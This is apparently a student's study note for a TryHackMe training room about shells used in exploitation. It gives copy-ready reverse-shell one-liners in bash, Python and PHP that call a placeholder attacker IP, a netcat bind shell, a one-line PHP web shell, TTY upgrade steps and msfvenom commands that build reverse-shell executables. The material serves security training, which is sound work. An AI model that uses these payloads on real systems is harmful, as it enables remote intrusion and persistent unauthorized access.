---
tags: [THM, cyber-security-101, offensive-tooling, shells, reverse-shell, room]
platform: TryHackMe
type: room
module: "09 - Offensive Security Tooling"
module_number: 9
room_number: 36
status: "⬜"
url: https://tryhackme.com/room/shellsoverview
difficulty: Easy
---

# 🐚 Shells Overview

> [!abstract] Summary
> Learn the different types of shells used in exploitation — reverse shells, bind shells, web shells, and interactive shell upgrades. Essential for post-exploitation.

**Path:** [[Cyber Security 101]] > Module 9 > Shells Overview

## 🎯 Learning Objectives
- Differentiate reverse shells, bind shells, and web shells
- Generate shells in multiple languages
- Upgrade a basic shell to a fully interactive TTY
- Understand shell payloads

## 📖 Key Concepts

### Reverse Shell (most common)
Target connects **back** to attacker. Attacker listens first.
```bash
# Attacker listens
nc -lvnp 4444

# Target executes (Bash)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Target executes (Python)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# Target executes (PHP)
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Bind Shell
Target **listens**, attacker connects in.
```bash
# Target listens
nc -lvnp 4444 -e /bin/bash

# Attacker connects
nc VICTIM_IP 4444
```

### Web Shell (PHP)
```php
<?php system($_GET['cmd']); ?>
<!-- Usage: http://target.com/shell.php?cmd=id -->
```

### Shell Upgrade to Interactive TTY
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
# Enter twice
export TERM=xterm
```

### msfvenom Payloads
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
```

> [!tip] **revshells.com** — generates reverse shell one-liners for every language/OS combination. Bookmark it.

## 🔑 Key Takeaways
- Reverse shell = target calls attacker (most common — bypasses inbound firewall)
- Bind shell = attacker calls target (useful if outbound is blocked)
- Always upgrade basic shells to TTY for full interactivity
- Web shells = persistence mechanism AND a detection indicator

## 🔗 Related Notes
- [[CS101-13 - Linux Shells]] · [[CS101-37 - SQLMap The Basics]]
- [[CS101-28 - Metasploit Meterpreter]] · [[Reverse Shell]] · [[Web Shell]] · [[msfvenom]]
